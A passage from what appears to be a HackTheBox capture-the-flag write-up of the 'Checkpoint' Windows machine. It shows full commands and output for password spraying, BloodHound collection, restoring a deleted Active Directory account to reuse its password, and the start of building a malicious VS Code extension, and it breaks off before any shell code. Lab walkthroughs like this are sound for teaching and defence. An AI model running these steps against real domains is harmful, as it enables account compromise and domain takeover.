---
title: "Checkpoint"
date: 2026-10-24 00:00:00 +0500
categories: [HackTheBox, Windows]
tags: [Tombstone, VSCode-Extension, BadSuccessor, MemoryForensics]
description: Writeup for HackTheBox Checkpoint machine
image:
  path: assets/img/checkpoint/checkpoint.png
  alt: HTB Checkpoint
---

## Executive Summary

The attack chain consists of the following key phases:
- **Information Gathering & Reconnaissance**: Mapping the network topology via Nmap and configuring internal DNS resolution.
- **Active Directory Enumeration**: Identifying Active Directory environment configurations, verifying strict LDAP signing enforcements, and collecting domain topology data using `bloodyAD` and `rusthound-ce`.
- **Active Directory Recycle Bin Abuse**: Discovering write permissions on the `Deleted Objects` container and abusing it to restore a deleted user account (`Mark Davies`) using `bloodyAD`.
- **Initial Access**: Exploiting an automated VS Code extension deployment folder (`DevDrop` SMB share) by constructing a custom, lightweight malicious `.vsix` extension to execute a reverse shell, landing as `ryan.brooks`.
- **Privilege Escalation (BadSuccessor - CVE-2025-53779)**: Abusing delegated Managed Service Accounts (dMSAs) delegation rights on an OU to establish a malicious dMSA link to a higher-privileged service account (`svc_deploy`) and retrieving its NT hash.
- **Offline Memory Forensics**: Utilizing `svc_deploy`'s access to retrieve a VMware memory dump (`.vmem`) from the `VMBackups` share, then extracting the local Domain Administrator's NTLM hash using `Volatility3`.
- **Domain Takeover**: Authenticating as Domain Administrator via Pass-the-Hash (PtH) and dumping all domain credentials via DCSync.

---

## 1. Information Gathering & Reconnaissance

### Nmap Port Scan

To begin the assessment, we run a two-stage Nmap scan. First, we perform a fast port discovery to locate all open ports. Second, we run a detailed service enumeration and script scan (`-sC` and `-sV`) on the discovered ports to profile the targets.

#### Tool Overview: Nmap
Nmap (Network Mapper) is an open-source tool for network discovery and security auditing. It sends custom packets to target ports to analyze responses, identifying active hosts, protocols, services, and version details.

- **`-sC`**: Runs default Nmap script engine (NSE) scripts to identify common vulnerabilities and configurations.
- **`-sV`**: Determines the service protocol name and version details running on open ports.
- **`-Pn`**: Disables ICMP ping requests, assuming the host is online.
- **`-oN`**: Saves the results in normal Nmap format.

```
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ sudo nmap -sC -sV -Pn -p $(sudo nmap -Pn -p- --min-rate 8000 $ip | grep 'open' | cut -d '/' -f 1 | paste -sd ,) $ip -oN nmap.scan

# Nmap 7.99 scan initiated Fri Jun 19 11:08:56 2026 as: /usr/lib/nmap/nmap -sC -sV -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49670,49671,49673,49674,49680,49704,49713 -oN nmap.scan 10.129.31.35
Nmap scan report for 10.129.31.35
Host is up (0.22s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-19 13:08:49Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
49664/tcp open  msrpc             Microsoft Windows RPC
49670/tcp open  msrpc             Microsoft Windows RPC
49671/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  msrpc             Microsoft Windows RPC
49674/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49680/tcp open  msrpc             Microsoft Windows RPC
49704/tcp open  msrpc             Microsoft Windows RPC
49713/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-06-19T13:09:43
|_  start_date: N/A
|_clock-skew: 6h59m44s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

Based on the scan output:
- **Port 53 (DNS)**: Resolves hostnames for the domain namespace.
- **Port 88 (Kerberos)**: Performs domain authentication.
- **Port 389/636/3268/3269 (LDAP/LDAPS)**: Manages directory services.
- **Port 445 (SMB)**: Handles server message blocks for shared folder access.
- **Port 5985 (WinRM)**: Handles Windows Remote Management.
- **Domain Name**: `checkpoint.htb`
- **Hostname**: `DC01`

### DNS and Host Resolution

To ensure we can resolve hostnames associated with the domain controller, we query the Domain Controller name using NetExec and append it to our local `/etc/hosts` configuration file.

#### Tool Overview: NetExec (nxc)
NetExec is a multi-protocol credential exploitation and enumeration tool designed to automate security audits of large networks. It supports SMB, LDAP, WinRM, SSH, and database protocols.

```
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ netexec smb $ip --generate-hosts-file hosts
SMB         10.129.36.76    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
                                                                                                                                                 
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ cat hosts | sudo tee -a /etc/hosts
10.129.36.76     DC01.checkpoint.htb checkpoint.htb DC01
```

---

## 2. Active Directory Enumeration

As is common in real life pentests, you will start the Checkpoint box with credentials `alex.turner / Checkpoint2024!`

### SMB Shares Enumeration

We use NetExec with the `spider_plus` module. This module enumerates the Active Directory shares and generates a JSON metadata structure detailing folder structures and file locations.

```
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ netexec smb $ip -u alex.turner -p 'Checkpoint2024!' -M spider_plus -o OUTPUT_FOLDER=.
SMB         10.129.36.76    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)                                                                                                                                  
SMB         10.129.36.76    445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
SPIDER_PLUS 10.129.36.76    445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.36.76    445    DC01             [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.36.76    445    DC01             [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.36.76    445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.36.76    445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.36.76    445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.36.76    445    DC01             [*]  OUTPUT_FOLDER: .
SMB         10.129.36.76    445    DC01             [*] Enumerated shares
SMB         10.129.36.76    445    DC01             Share           Permissions     Remark
SMB         10.129.36.76    445    DC01             -----           -----------     ------
SMB         10.129.36.76    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.36.76    445    DC01             C$                              Default share
SMB         10.129.36.76    445    DC01             DevDrop         READ            VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0                                                                                                                   
SMB         10.129.36.76    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.36.76    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.36.76    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.36.76    445    DC01             VMBackups                       
SPIDER_PLUS 10.129.36.76    445    DC01             [+] Saved share-file metadata to "./10.129.36.76.json".
SPIDER_PLUS 10.129.36.76    445    DC01             [*] SMB Shares:           7 (ADMIN$, C$, DevDrop, IPC$, NETLOGON, SYSVOL, VMBackups)
SPIDER_PLUS 10.129.36.76    445    DC01             [*] SMB Readable Shares:  4 (DevDrop, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.129.36.76    445    DC01             [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.36.76    445    DC01             [*] Total folders found:  16
SPIDER_PLUS 10.129.36.76    445    DC01             [*] Total files found:    5
SPIDER_PLUS 10.129.36.76    445    DC01             [*] File size average:    1.59 KB
SPIDER_PLUS 10.129.36.76    445    DC01             [*] File size min:        22 B
SPIDER_PLUS 10.129.36.76    445    DC01             [*] File size max:        4.11 KB
```

Two notable details stand out from this share enumeration:
- **`DevDrop`**: Read-only access for `alex.turner`. The description details it as an extension share for VS Code engine `1.118.0`.
- **`VMBackups`**: Restricted access. We currently cannot read or write to it, but it indicates the presence of virtual machine backup archives.

We review the JSON file generated by the `spider_plus` module:

```
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ jq . 10.129.36.76.json                                              
{
  "DevDrop": {},
  "NETLOGON": {},
  "SYSVOL": {
    "checkpoint.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
      "atime_epoch": "2026-05-09 13:43:48",
      "ctime_epoch": "2026-05-09 13:39:34",
      "mtime_epoch": "2026-05-09 13:43:48",
      "size": "22 B"
    },
    "checkpoint.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
      "atime_epoch": "2026-05-09 13:39:34",
      "ctime_epoch": "2026-05-09 13:39:34",
      "mtime_epoch": "2026-05-09 13:39:34",
      "size": "1.07 KB"
    },
    "checkpoint.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
      "atime_epoch": "2026-05-09 13:43:48",
      "ctime_epoch": "2026-05-09 13:43:48",
      "mtime_epoch": "2026-05-09 13:43:48",
      "size": "2.73 KB"
    },
    "checkpoint.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
      "atime_epoch": "2026-05-10 18:58:41",
      "ctime_epoch": "2026-05-09 13:39:34",
      "mtime_epoch": "2026-05-10 18:58:41",
      "size": "22 B"
    },
    "checkpoint.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
      "atime_epoch": "2026-05-10 18:58:40",
      "ctime_epoch": "2026-05-09 13:39:34",
      "mtime_epoch": "2026-05-10 18:58:40",
      "size": "4.11 KB"
    }
  }
}
```

The share metadata only contains default Group Policy Objects (GPOs), showing no sensitive files exposed on the readable shares.

### Domain Password Spraying

We run a password spray across all identified users utilizing the password `Checkpoint2024!`. 

To perform Kerberos authentication reliably, we prepended the execution with `faketime` referencing `ntpdate`. This forces the local shell's system clock to match the Domain Controller's clock for the duration of the command execution, preventing authentication failures caused by clock skew limits (which Kerberos strictly enforces to prevent replay attacks).

```
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ faketime -f "@$(ntpdate -q $ip | cut -d ' ' -f 1,2)" netexec smb $ip -u users.txt -p 'Checkpoint2024!' -k --continue-on-success 
SMB         10.129.36.76    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)                                                                                                                                  
SMB         10.129.36.76    445    DC01             [-] checkpoint.htb\Administrator:Checkpoint2024! KDC_ERR_PREAUTH_FAILED 
SMB         10.129.36.76    445    DC01             [-] checkpoint.htb\Guest:Checkpoint2024! KDC_ERR_ETYPE_NOSUPP 
SMB         10.129.36.76    445    DC01             [-] checkpoint.htb\krbtgt:Checkpoint2024! KDC_ERR_CLIENT_REVOKED 
SMB         10.129.36.76    445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
SMB         10.129.36.76    445    DC01             [-] checkpoint.htb\ryan.brooks:Checkpoint2024! KDC_ERR_PREAUTH_FAILED 
SMB         10.129.36.76    445    DC01             [-] checkpoint.htb\svc_deploy:Checkpoint2024! KDC_ERR_PREAUTH_FAILED 
SMB         10.129.36.76    445    DC01             [-] checkpoint.htb\james.harper:Checkpoint2024! KDC_ERR_PREAUTH_FAILED 
SMB         10.129.36.76    445    DC01             [-] checkpoint.htb\sarah.mitchell:Checkpoint2024! KDC_ERR_PREAUTH_FAILED 
SMB         10.129.36.76    445    DC01             [-] checkpoint.htb\emily.carter:Checkpoint2024! KDC_ERR_PREAUTH_FAILED 
SMB         10.129.36.76    445    DC01             [-] checkpoint.htb\david.reynolds:Checkpoint2024! KDC_ERR_PREAUTH_FAILED 
SMB         10.129.36.76    445    DC01             [-] checkpoint.htb\jessica.coleman:Checkpoint2024! KDC_ERR_PREAUTH_FAILED 
SMB         10.129.36.76    445    DC01             [-] checkpoint.htb\lauren.flores:Checkpoint2024! KDC_ERR_PREAUTH_FAILED 
SMB         10.129.36.76    445    DC01             [-] checkpoint.htb\michael.torres:Checkpoint2024! KDC_ERR_PREAUTH_FAILED 
SMB         10.129.36.76    445    DC01             [-] checkpoint.htb\kevin.patterson:Checkpoint2024! KDC_ERR_PREAUTH_FAILED 
SMB         10.129.36.76    445    DC01             [-] checkpoint.htb\brian.jenkins:Checkpoint2024! KDC_ERR_PREAUTH_FAILED 
SMB         10.129.36.76    445    DC01             [-] checkpoint.htb\megan.perry:Checkpoint2024! KDC_ERR_PREAUTH_FAILED 
SMB         10.129.36.76    445    DC01             [-] checkpoint.htb\max.palmer:Checkpoint2024! KDC_ERR_PREAUTH_FAILED 
```

The password spray confirms that `alex.turner` is the only active account using the `Checkpoint2024!` credential.

### Active Directory Data Collection & LDAP Signing Enforcements

In Active Directory environments, querying directory structures requires collecting data for analysis (such as through BloodHound). However, we must first verify LDAP configurations. 

We query LDAP using NetExec:

```
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ netexec ldap $ip                                            
LDAP        10.129.36.76    389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert)                                                                                                                 
```

The LDAP service enforces signing (`signing:Enforced`).

#### Understanding LDAP Signing
LDAP signing is a security mechanism that signs LDAP traffic cryptographically. It ensures data integrity and prevents relay attacks (such as SMB-to-LDAP relaying) by validating that queries originate from the authenticated client without modification. When LDAP signing is strictly enforced:
- Unsigned or anonymous LDAP queries are rejected.
- Traditional `bloodhound-python` collectors and standard `netexec --bloodhound` flags fail if they attempt to connect without signed requests.
- Attackers must use tools capable of executing signed LDAP operations or utilize Kerberos tickets (`-k` flags) to execute authenticated queries.

To dump BloodHound objects while satisfying LDAP signing enforcements, we can use `bloodyAD` or `rusthound-ce`.

#### 1. Collecting Data with `bloodyAD`
We run `bloodyAD` to fetch the Active Directory database objects. `bloodyAD` is an Active Directory administration tool that directly manages objects via LDAP/LDAPS. It can fetch, add, delete, and modify AD objects, and handles LDAP connections securely, exporting the parsed directory trees directly to a zip file format suitable for BloodHound.

```
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ bloodyad -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb -i $ip -H DC01.checkpoint.htb get bloodhound  
[+] Connecting to LDAP server
[+] Connected to LDAP serrver
Dumping schema: 2it [00:01,  1.78it/s]
Generating lookuptable: 106it [00:03, 32.88it/s]
Dumping SDs: 100%|█████████████████████████████████████████████████████████████████████████████████████████████| 110/110 [00:47<00:00,  2.33it/s]
Dumping domains: 100%|█████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00,  1.41it/s]
Dumping users: 100%|█████████████████████████████████████████████████████████████████████████████████████████████| 17/17 [00:02<00:00,  6.19it/s]
Dumping computers: 100%|███████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00,  4.62it/s]
Dumping groups: 100%|████████████████████████████████████████████████████████████████████████████████████████████| 58/58 [00:01<00:00, 51.16it/s]
Dumping GPOs: 100%|████████████████████████████████████████████████████████████████████████████████████████████████| 2/2 [00:00<00:00,  8.80it/s]
Dumping OUs: 100%|█████████████████████████████████████████████████████████████████████████████████████████████████| 8/8 [00:00<00:00, 34.92it/s]
Dumping Containers: 100%|████████████████████████████████████████████████████████████████████████████████████████| 19/19 [00:00<00:00, 19.22it/s]
[+] Bloodhound data saved to 20260619T185610_Bloodhound.zip
[+] Found 0 trusts
```

#### 2. Collecting Data with `rusthound-ce`
Alternatively, we can fetch directory objects using `rusthound-ce`. RustHound is a cross-compiled Active Directory collector written in Rust. It generates BloodHound compatible JSON files, executing tasks significantly faster than Python-based collectors.

This requires authenticating via Kerberos. We request a Ticket Granting Ticket (TGT) using Impacket's `getTGT` utility, save the ticket cache locally, generate a Kerberos configuration file, and execute the scan:

```
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ impacket-getTGT checkpoint.htb/alex.turner:'Checkpoint2024!' -dc-ip $ip 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in alex.turner.ccache
                                                                                                                                                 
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ export KRB5CCNAME=/home/kali/HTB/AD/Checkpoint/alex.turner.ccache 
                                                                                                                                                 
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ netexec smb $ip --generate-krb5-file krb5.conf              
SMB         10.129.31.35    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)                                                                                                                                  
[+] krb5 conf saved to: krb5.conf
[+] Run the following command to use the conf file: export KRB5_CONFIG=krb5.conf
                                                                                                                                                 
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ export KRB5_CONFIG=/home/kali/HTB/AD/Checkpoint/krb5.conf        

┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ rusthound-ce -u alex.turner -k -d checkpoint.htb -i $ip -f DC01.checkpoint.htb -c All -o rusthound_output  
---------------------------------------------------
Initializing RustHound-CE at 23:52:18 on 06/19/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-06-19T18:52:18Z INFO  rusthound_ce] Verbosity level: Info
[2026-06-19T18:52:18Z INFO  rusthound_ce] Collection method: All
[2026-06-19T18:52:19Z INFO  rusthound_ce::ldap] Connected to CHECKPOINT.HTB Active Directory!
[2026-06-19T18:52:19Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-06-19T18:52:20Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-06-19T18:52:22Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=checkpoint,DC=htb
[2026-06-19T18:52:22Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-06-19T18:52:24Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=checkpoint,DC=htb
[2026-06-19T18:52:24Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-06-19T18:52:26Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=checkpoint,DC=htb
[2026-06-19T18:52:26Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-06-19T18:52:27Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=checkpoint,DC=htb
[2026-06-19T18:52:27Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-06-19T18:52:27Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=checkpoint,DC=htb
[2026-06-19T18:52:27Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-06-19T18:52:27Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-06-19T18:52:27Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-06-19T18:52:27Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-06-19T18:52:27Z INFO  rusthound_ce::json::maker::common] 18 users parsed!
[2026-06-19T18:52:27Z INFO  rusthound_ce::json::maker::common] rusthound_output/20260619235227_checkpoint-htb_users.json created!
[2026-06-19T18:52:27Z INFO  rusthound_ce::json::maker::common] 70 groups parsed!
[2026-06-19T18:52:27Z INFO  rusthound_ce::json::maker::common] rusthound_output/20260619235227_checkpoint-htb_groups.json created!
[2026-06-19T18:52:27Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-06-19T18:52:27Z INFO  rusthound_ce::json::maker::common] rusthound_output/20260619235227_checkpoint-htb_computers.json created!
[2026-06-19T18:52:27Z INFO  rusthound_ce::json::maker::common] 8 ous parsed!
[2026-06-19T18:52:27Z INFO  rusthound_ce::json::maker::common] rusthound_output/20260619235227_checkpoint-htb_ous.json created!
[2026-06-19T18:52:27Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-06-19T18:52:27Z INFO  rusthound_ce::json::maker::common] rusthound_output/20260619235227_checkpoint-htb_domains.json created!
[2026-06-19T18:52:27Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-06-19T18:52:27Z INFO  rusthound_ce::json::maker::common] rusthound_output/20260619235227_checkpoint-htb_gpos.json created!
[2026-06-19T18:52:27Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2026-06-19T18:52:27Z INFO  rusthound_ce::json::maker::common] rusthound_output/20260619235227_checkpoint-htb_containers.json created!

RustHound-CE Enumeration Completed at 23:52:27 on 06/19/26! Happy Graphing!
```

### Active Directory Certificate Services (ADCS) Check

We query the domain controller to see if ADCS (Active Directory Certificate Services) is running. ADCS can occasionally be exploited via misconfigured templates (such as ESC1 through ESC8) to escalate privileges to Domain Admin.

```
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ netexec ldap $ip -u alex.turner -p 'Checkpoint2024!' -M adcs                             
LDAP        10.129.36.76    389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert)                                                                                                                 
LDAP        10.129.36.76    389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
ADCS        10.129.36.76    389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
```

No results are returned, confirming that ADCS is not installed in this environment.

---

## 3. Privilege Path Analysis & User Account Manipulation

### BloodHound Graph Analysis

We load the collected directory database archives into BloodHound to analyze security relationships and exploit paths.

- **`alex.turner` Groups**:
  `alex.turner` resides inside the `EMPLOYEES` Organizational Unit (OU). Outside of standard domain membership (`Domain Users`), he belongs to `IT-Staff` and `VPN-Users`.

  <img src="assets/img/checkpoint/alex_groups.png" alt="error loading image">

- **`ryan.brooks` Permissions**:
  `ryan.brooks` has a `GenericWrite` relation targeting `svc_deploy`.

  <img src="assets/img/checkpoint/write_on_svc_deploy.png" alt="error loading image">

#### Understanding GenericWrite Permissions
`GenericWrite` is an access control permission within Active Directory. It allows an attacker to modify any non-protected attribute on a target object. For a target user account, this control can be abused to:
- Establish a **Service Principal Name (SPN)** to kerberoast the user (`setspn` attack).
- Toggle account options (such as disabling Kerberos Pre-Authentication for **AS-REP Roasting**).
- Modify the `msDS-KeyCredentialLink` attribute to configure **Shadow Credentials**, allowing the attacker to request a TGT as the user via PKINIT.
- Assign malicious logon scripts.

A Cypher query on BloodHound shows no initial kerberoastable or AS-REP roastable accounts reachable from `alex.turner`. We use `bloodyAD` to check for specific writable properties.

### Exploiting the Active Directory Recycle Bin (Deleted Objects Container)

We query Active Directory for objects that are writable by `alex.turner`:

```
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ bloodyad -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb -i $ip get writable  

distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD
```

#### Abuse Path: Deleted Objects Restoration
The `Deleted Objects` container is a system partition where Active Directory moves directory objects (users, computers, groups, OUs) upon deletion. If the Active Directory Recycle Bin is enabled, deleted objects are preserved in this container for a specified retention period (the Tombstone Lifetime). 

By default, standard users cannot view or interact with this container. However, the output reveals that `alex.turner` has **WRITE** permissions to the `Deleted Objects` container and **WRITE** permissions over a specific deleted user account: `CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e`.

An attacker can abuse this path to:
1. Restore a previously deleted account.
2. Exploit default permissions or password reuse on the restored account to gain higher privileges or access new services.

We abuse our write access to restore the `Mark Davies` account from the `Deleted Objects` container:

```
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ bloodyad -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb -i $ip set restore 'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'                                                               
[+] CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb                                                                   
```

Once restored, we query writable properties again to verify permissions:

```
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ bloodyad -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb -i $ip get writable --otype useronly         

distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE
```

We now have direct `genericWrite` access over `CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb`:

<img src="assets/img/checkpoint/write_on_mark_davies.png" alt="error loading image">

This write relationship enables several escalation vectors:
- **Set a Service Principal Name (SPN) for Kerberoasting**: Assigning an SPN to the target account and requesting a Kerberos ticket to crack the user's password offline.
- **AS-REP Roasting**: Disabling pre-authentication (`DONT_REQ_PREAUTH` configuration in User Account Control) and requesting a TGT to crack the password.
- **Shadow Credentials**: Overwriting the `msDS-KeyCredentialLink` attribute to authenticate as the target.
- **Modify Logon Scripts**: Changing logon scripts to run malicious commands.

ADCS is not present in this environment, making Shadow Credentials unviable. We test for credential reuse by spraying the original password `Checkpoint2024!` against the newly restored `mark.davies` account:

```
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ faketime -f "@$(ntpdate -q $ip | cut -d ' ' -f 1,2)" netexec smb $ip -u mark.davies -p 'Checkpoint2024!' -k --continue-on-success
SMB         10.129.36.76    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)                                                                                                                                  
SMB         10.129.36.76    445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024!
```

Due to credential reuse, `mark.davies` is compromised using the password `Checkpoint2024!`.

---

## 4. Initial Access via Malicious VSIX Extension

### Target Share Analysis

We enumerate the SMB shares accessible to `mark.davies`:

```
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ netexec smb $ip -u mark.davies -p 'Checkpoint2024!' --shares
SMB         10.129.36.76    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)                                                                                                                                  
SMB         10.129.36.76    445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024! 
SMB         10.129.36.76    445    DC01             [*] Enumerated shares
SMB         10.129.36.76    445    DC01             Share           Permissions     Remark
SMB         10.129.36.76    445    DC01             -----           -----------     ------
SMB         10.129.36.76    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.36.76    445    DC01             C$                              Default share
SMB         10.129.36.76    445    DC01             DevDrop         READ,WRITE      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0                                                                                                                   
SMB         10.129.36.76    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.36.76    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.36.76    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.36.76    445    DC01             VMBackups                       
```

`mark.davies` has **WRITE** access to the `DevDrop` share. The remark indicates a backend mechanism scans this folder and auto-deploys compatible VS Code extensions (`.vsix` packages) matching engine version `1.118.0`.

### Abuse Path: Malicious VSIX Extension Execution

The target server implements an automated deployment system that monitors the `DevDrop` SMB share for `.vsix` packages. 

When a `.vsix` file is placed in this share:
1. The automated service reads the file metadata.
2. It attempts to install it into the system's VS Code engine.
3. If configured to activate on startup or on wildcard events (`*`), the extension's entrypoint code (`activate()`) is immediately executed by the host process.
4. The code runs with the permissions of the user context executing the VS Code instance, which in this case is `checkpoint\ryan.brooks`.

To exploit this, we must build a minimal `.vsix` package. Standard development workflows using the Microsoft Yeoman generator (`yo code`) create large files:

```shell
npx --package yo --package generator-code -- yo code
```

When compiled into a `.vsix` archive, this template outputs a package of approximately 75 MB. To minimize upload size and avoid resource limits, we manually build a minimal `.vsix` structure.

#### Structure of a VSIX Extension Package
A `.vsix` file is a ZIP archive conforming to the Open Packaging Conventions (OPC). It contains the extension's runtime JavaScript code and several XML/JSON manifest files that specify metadata, dependency requirements, and configuration entrypoints:

- **`package.json`**: The extension's Node.js manifest. It defines key fields:
  - `"engines"`: Dictates VS Code version compatibility. We specify `"vscode": "^1.118.0"` to match the target's environment.
